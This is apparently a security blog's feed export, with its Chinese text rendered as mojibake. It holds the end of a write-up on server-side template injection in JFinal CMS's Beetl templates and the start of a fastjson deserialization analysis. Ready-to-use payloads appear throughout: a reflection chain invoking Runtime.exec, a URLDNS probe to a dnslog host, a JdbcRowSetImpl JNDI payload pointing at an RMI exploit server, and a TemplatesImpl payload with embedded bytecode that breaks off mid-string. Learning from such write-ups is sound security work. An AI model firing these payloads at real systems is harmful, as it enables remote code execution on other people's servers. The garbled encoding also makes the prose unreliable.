ç‚¹å‡»ä¿å­˜é¡µé¢çš„é¦–å…ˆä¼šè¿›å…¥åˆ°<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>ç„¶ååˆ¤æ–­è¯·æ±‚æ–¹æ³•ï¼Œæ˜¯POSTæ–¹æ³•ä¼šåˆ¤æ–­æ˜¯uploadè¿˜æ˜¯saveFileï¼Œå¦‚æœæ˜¯saveFileæ–¹æ³•ä¼šè·³è½¬åˆ°<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManager.java</code>ä¸­çš„saveFileæ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200414163459783.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">saveFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        JSONObject array = <span class="keyword">new</span> JSONObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String content = <span class="keyword">this</span>.get.get(<span class="string">"content"</span>);</span><br><span class="line">            content = FileManagerUtils.decodeContent(content);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// before bakup</span></span><br><span class="line">            bakupFile(<span class="keyword">new</span> File(getRealFilePath()));</span><br><span class="line"></span><br><span class="line">            FileManagerUtils.writeString(getRealFilePath(), content);</span><br><span class="line">            array.put(<span class="string">"Path"</span>, <span class="keyword">this</span>.get.get(<span class="string">"path"</span>));</span><br><span class="line">            array.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">            array.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"JSONObject error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"JSONObject error"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"IOException error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"IOException error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; å‰æœŸå¯ä»¥ä¿®æ”¹ä»£ç æœºåˆ¶æˆ‘ä»¬å·²ç»äº†è§£çš„å¾ˆæ¸…æ¥šäº†ï¼Œæ²¡æœ‰åšä»»ä½•çš„é˜²æŠ¤æªæ–½ã€‚ä½†è¿™äº›è¿œè¿œè¾¾ä¸åˆ°SSTIçš„è¦æ±‚ã€‚<code>åˆ¤æ–­ä¸€ä¸ªç³»ç»Ÿæˆ–è€…CMSæ˜¯å¦ä½¿ç”¨äº†ä»»ä½•ä¸€ä¸ªæ¨¡æ¿å¼•æ“</code>ï¼Œå…ˆæœ‰æ¯”è¾ƒå¤§ä¼—Javaæ¨¡æ¿å¼•æ“æœ‰Velocityï¼ŒFreemarkerï¼Œè€Œè¿™æ¬¾æ¨¡æ¿å¼•æ“æ˜¯beetlï¼ŒæŒ–æ˜ä¹‹é—´æ ¹æœ¬æ²¡æœ‰äº†è§£è¿‡ã€‚æ®æŸ¥é˜…çŸ¥é“ï¼Œè¿™æ˜¯ä¸€æ¬¾å›½äº§çš„æ¨¡æ¿å¼•æ“ã€‚<a href="http://ibeetl.com/" target="_blank" rel="noopener">å®˜æ–¹åœ°å€</a>ï¼Œå®˜ç½‘è¯´æœ‰å¾ˆå¤šä¼˜åŠ¿ï¼Œæ„Ÿè§‰ä¸€èˆ¬èˆ¬ï¼Œå¹ç‰›çš„æ°´åˆ†æ¯”è¾ƒå¤§å§ã€‚åœ¨ç ”ç©¶è¿™ä¸ªæ¨¡æ¿çš„æ—¶å€™ï¼Œå®˜æ–¹ç»™<a href="http://ibeetl.com/guide/#/beetl/" target="_blank" rel="noopener">æ–‡æ¡£</a>çœŸçš„å¾ˆå·®ï¼Œæœ‰äº›ä¸œè¥¿è¯´çš„ä¸€çŸ¥åŠè§£æ²¡æœ‰è¯´æ¸…æ¥šã€‚<br><img src="https://img-blog.csdnimg.cn/20200414164508404.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200414165055321.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h4 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h4><p>&emsp;&emsp; æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œäº†è§£è¿™æ¬¾æ¨¡æ¿å¼•æ“è°ƒç”¨Javaæ–¹æ³•å’Œå±æ€§æ¨¡å¼ã€‚<br><img src="https://img-blog.csdnimg.cn/20200414171840853.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æœ¬æ–‡æ„é€ payloadå¾—æœ‰ç®€å•Javaçš„åå°„æœºåˆ¶åŸºç¡€ã€‚<a href="https://www.cnblogs.com/haha12/p/4724204.html" target="_blank" rel="noopener">æ¨èæ–‡ç« </a>ï¼Œæ–‡ç« ä¸­ç”¨äº†ä¸€ä¸ªç®€å•æ¡ˆä¾‹å†ç°äº†Javaçš„åå°„ã€‚<a href="https://blog.csdn.net/SECURE2/article/details/81099574?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">æ¨èæ–‡ç« </a>,æ–‡ç« ç”¨å¾ˆå¤šè§£é‡Šæ˜¯å…³äºJavaåå°„å’Œç±»åŠ è½½çš„çŸ¥è¯†å†…å®¹ã€‚[æ–°å¢]<a href="https://www.bilibili.com/video/BV1s4411U7x9?from=search&seid=13854513651556834308" target="_blank" rel="noopener">æ¨èè§†é¢‘</a><br>[video(video-hkteTk7M-1587384668444)(type-bilibili)(url-<a href="https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-ã€Javaåå°„æœºåˆ¶ã€‘ä¸æ‡‚åå°„æœºåˆ¶ä¸é…å½“javaç¨‹åºå‘˜?)]" target="_blank" rel="noopener">https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-ã€Javaåå°„æœºåˆ¶ã€‘ä¸æ‡‚åå°„æœºåˆ¶ä¸é…å½“javaç¨‹åºå‘˜?)]</a></p><h4 id="Payloadæ„é€ "><a href="#Payloadæ„é€ " class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h4><p>&emsp;&emsp; è¿™é‡Œç¬”è€…å°†payloadæ‹†è§£äº†ï¼Œæ–¹ä¾¿æ›´å¥½çš„è§£è¯»ä¸€ä¸‹payloadã€‚ç”±äºbeetlæ¨¡æ¿å¼•æ“ç¦æ­¢äº†<code>java.lang.Runtime</code>å’Œ<code>java.lang.Process</code>ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥è°ƒç”¨è¿›ç¨‹æ¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚è¿™é‡Œé‡‡ç”¨Javaåå°„æœºåˆ¶æ¥è¾¾åˆ°æ•ˆæœï¼Œå½“ç„¶ä¹Ÿæœ‰å…¶ä»–çš„æ–¹æ³•ï¼Œæ¯”ä¾‹å†™æ–‡ä»¶ç­‰ã€‚è¯»è€…ä»¬å¯ä»¥è‡ªè¡Œå°è¯•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>å…ˆå¿½è§†ä¸Šé¢çš„payloadï¼Œä¸‹é¢ä¼šä¸€æ­¥æ­¥è§£ç­”ï¼Œæœ€åå®Œæ•´çš„payload</strong><br><img src="https://img-blog.csdnimg.cn/2020041418081219.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol><li>æˆ‘ä»¬ä¸”çœ‹ç¬¬ä¸€è¡Œï¼ŒæŒ‰ç…§ä¸Šé¢ç»™å‡ºç®€å•æ¡ˆä¾‹æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥è¿™æ ·å­å°±å¯ä»¥äº†<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>ä½†æ˜¯ç›´æ¥String.classç›´æ¥å†™æ¨¡æ¿æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ç»§ç»­æ„é€ payloadï¼Œå°†String.classè½¬åŒ–<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>çš„å½¢å¼ï¼Œç„¶åpayloadå°±å˜æˆä¸‹é¢è¿™æ ·å­äº†ã€‚<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>ç…§é“ç†ä¸Šé¢å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ï¼Œä½†æ˜¯å‘¢Runtimeç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨newInstance()æ–¹æ³•æ¥å®ä¾‹åŒ–ã€‚åªèƒ½é€šè¿‡è°ƒç”¨getRuntime()æ–¹æ³•æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚æ‰€ä»¥newInstance()å¾—æ›¿æ¢æˆ<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>æœ€ç»ˆpayloadå°±å˜æˆäº†ä¸‹é¢è¿™æ ·å­ã€‚<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; é‡åˆ°ä½¿ç”¨äº†æ¨¡æ¿çš„è§£æCMSå¯ä»¥æ ¹æ®æ¨¡æ¿è§£æè¯­è¨€å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œè‹¥é‡åˆ°å‡½æ•°è­¦ç”¨çš„æƒ…å†µå¯ä»¥å°è¯•ä¸€äº›Bypassæ–¹æ³•ï¼Œæ¯”ä¾‹ä¸€äº›åå°„ã€ååºåˆ—åŒ–ã€å­—èŠ‚ç ä¿®æ”¹ç­‰ã€‚SSTIæ³¨å…¥éš¾çš„å…¶å®å¦‚ä½•æ„é€ Payloadï¼Œæ„é€ å¥½äº†ä¹‹åä¸€åˆ‡è‡ªç„¶è€Œç„¶äº†ã€‚</p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7" target="_blank" rel="noopener">http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; å­¦äº†ä¸€ä¸¤ä¸ªæœˆçš„Javaä»£ç å®¡è®¡ï¼Œå¯¹ä¸€äº›å®¡è®¡æœ‰äº†ä¸€å®šäº†è§£äº†ã€‚æ‰€ä»¥å†³å®šå®¡è®¡ä¸€ä¸‹JavaWeb CMSï¼Œéšä¾¿ç”³è¯·ä¸€ä¸‹CV
      
    
    </summary>
    
    
    
      <category term="Java æ–‡ä»¶ä¸Šä¼ " scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘å­¦ä¹ fastjsonååºåˆ—åŒ–å§‹</title>
    <link href="https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/"/>
    <id>https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/</id>
    <published>2020-07-23T00:22:16.000Z</published>
    <updated>2020-07-29T06:03:12.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>&emsp;&emsp; Fastjsonè¿™æ¬¾å›½å†…çŸ¥åçš„è§£æjsonçš„ç»„ä»¶ï¼Œç¬”è€…åœ¨æ­¤å°±ä¸å¤šä»‹ç»ï¼Œç½‘ç»œä¸Šæœ‰å¾ˆå¤šåˆ†æå­¦ä¹ fastjsonååºåˆ—åŒ–æ¼æ´æ–‡ç« ã€‚ç¬”è€…åœ¨æ­¤ä»¥ä¸€ç§å…¨æ–°è§’åº¦ä»åˆ†æpayloadæ„é€ è§’åº¦å‡ºå‘ï¼Œé€†å‘å­¦ä¹ åˆ†æfastjsonååºåˆ—åŒ–æ¼æ´å§‹æœ«ã€‚<br>psï¼šæ¼æ´å­¦ä¹ ç¯å¢ƒä»¥ä»£ç å‡åœ¨ä¸Šä¼ <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">Githubé¡¹ç›®</a>ã€‚</p><hr><h1 id="åˆçª¥Payload"><a href="#åˆçª¥Payload" class="headerlink" title="åˆçª¥Payload"></a>åˆçª¥Payload</h1><p>&emsp;&emsp; ä¸‹é¢æ˜¯ä¸€æ®µæœ€ç®€å•<code>Fastjsonçš„ç‰ˆæœ¬å·ååºåˆ—åŒ–--URLDNS</code>ä»£ç ï¼Œè§‚å¯Ÿå‘ç°å¯ä»¥æå‡ºä¸€ä¸ªé—®é¢˜<code>@type</code>ä½œç”¨ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dnslogå¹³å°ç½‘ç«™ï¼šhttp://www.dnslog.cn/</span></span><br><span class="line">        String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">                <span class="string">":\"http://h2a6yj.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="typeçš„ä½œç”¨"><a href="#typeçš„ä½œç”¨" class="headerlink" title="@typeçš„ä½œç”¨"></a>@typeçš„ä½œç”¨</h2><p>&emsp;&emsp; ä¸‹é¢æ˜¯ä¸€æ®µå®éªŒä»£ç ï¼Œå¸®åŠ©ç†è§£åˆ†æ<code>@type</code>çš„ç”±æ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="comment">//TODO ä¿®æ”¹pom.xmlä¸­çš„fastjson &lt;= 1.2.24</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">"summer"</span>);</span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        <span class="comment">// è½¬åŒ–çš„æ—¶å€™åŠ å…¥ä¸€ä¸ªåºåˆ—åŒ–çš„ç‰¹å¾ å†™å…¥ç±»å</span></span><br><span class="line">        <span class="comment">// feature = ç‰¹å¾</span></span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">// str2è¾“å…¥ç»“æœä¼šè¾“å‡º @type+ç±»å</span></span><br><span class="line">        <span class="comment">// ç”±æ­¤å¯çŸ¥@typeæ˜¯ç”¨äºè§£æJSONæ—¶çš„ç”¨äºæŒ‡å®šç±»</span></span><br><span class="line">        System.out.println(str1);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">        <span class="comment">//å¦‚æœfastjsonè§£æå†…å®¹æ—¶æ²¡æœ‰é…ç½®ï¼Œä¼šé»˜è®¤ä½¿ç”¨ç¼ºçœé…ç½®</span></span><br><span class="line">        <span class="comment">// TODO æŸ¥çœ‹parseæ–¹æ³• å¯ä»¥è®¾ç½®æ–­ç‚¹çœ‹çœ‹ä¸åŒä¹‹å¤„å’Œç›¸åŒä¹‹å¤„</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">//å¾ˆæ˜æ˜¾çš„ç»“æœä¸ä¸€æ ·</span></span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str1's parse1: "</span> + parse1);</span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str2's parse2: "</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142150824.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>&emsp;&emsp; å¯¹æ¯”åˆ†æä¸€ä¸‹ï¼Œåªè¦åœ¨JSONåºåˆ—åŒ–çš„æ–¹æ³•åŠ å…¥<code>SerializerFeature.WriteClassName</code>ç‰¹å¾å­—æ®µã€‚åºåˆ—åŒ–å‡ºæ¥çš„ç»“æœä¼šåœ¨å¼€å¤´åŠ ä¸€ä¸ª<code>@type</code>å­—æ®µï¼Œå€¼ä¸ºè¿›è¡Œåºåˆ—åŒ–çš„ç±»åã€‚å†å°†å¸¦æœ‰<code>@type</code>å­—æ®µçš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ä¼šå¾—åˆ°å¯¹åº”çš„å®ä¾‹ç±»å¯¹è±¡ã€‚ååºåˆ—åŒ–å¯ä»¥è·å–ç±»å¯¹è±¡ï¼Ÿæœ‰JavaåŸºç¡€çš„å®‰å…¨äººåº”è¯¥ä¼šæ•æ„Ÿçš„è¿™é‡Œåä¹‹å…«ä¹å­˜åœ¨æ¼æ´ã€‚<br>psï¼š ä¸‹é¢æ˜¯ä¸€æ®µéªŒè¯ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Vuldemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"vul.fastjson.User\",\"age\":18,\"name\":\"summer\"&#125;"</span>;</span><br><span class="line">        Object ob = JSON.parse(payload);</span><br><span class="line">System.out.println(<span class="string">"ååºåˆ—åŒ–åç±»å¯¹è±¡:  "</span> + ob.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"ååºåˆ—åŒ–ç»“æœ: "</span> + ob);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142644574.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="RCEâ€™s-payload"><a href="#RCEâ€™s-payload" class="headerlink" title="RCEâ€™s payload"></a>RCEâ€™s payload</h2><p>&emsp;&emsp; ç¬¬ä¸€ç§payloadæ˜¯ä½¿ç”¨<code>com.sun.rowset.JdbcRowSetImpl</code>ç±»ï¼Œç¬¬äºŒç§æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ã€‚ç¬¬äºŒç§ä¹‹å‰åœ¨<a href="https://samny.blog.csdn.net/article/details/106160182" target="_blank" rel="noopener">æ¼«è°ˆCommons-Collectionsååºåˆ—åŒ–</a>è®¨è®ºåˆ†æè¿‡ï¼Œè¿™é‡Œä¸å†é‡å¤ç€é‡è®¨è®ºåˆ†æç¬¬ä¸€ç§payloadã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://127.0.0.1:1090/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bW